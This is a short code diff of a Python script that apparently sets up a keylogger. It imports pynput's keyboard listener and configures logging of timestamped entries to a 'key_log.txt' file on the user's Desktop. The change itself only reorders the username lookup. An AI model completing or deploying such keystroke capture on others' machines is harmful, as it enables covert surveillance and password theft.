@@ -1,10 +1,8 @@
 from getpass import getuser
-laptop_name=str(getuser())
-
-
 from pynput.keyboard import Key,Listener
 import logging
 
+laptop_name=str(getuser())
 log_dir=f"C:/Users/{laptop_name}/Desktop/logs/"
 
 logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')
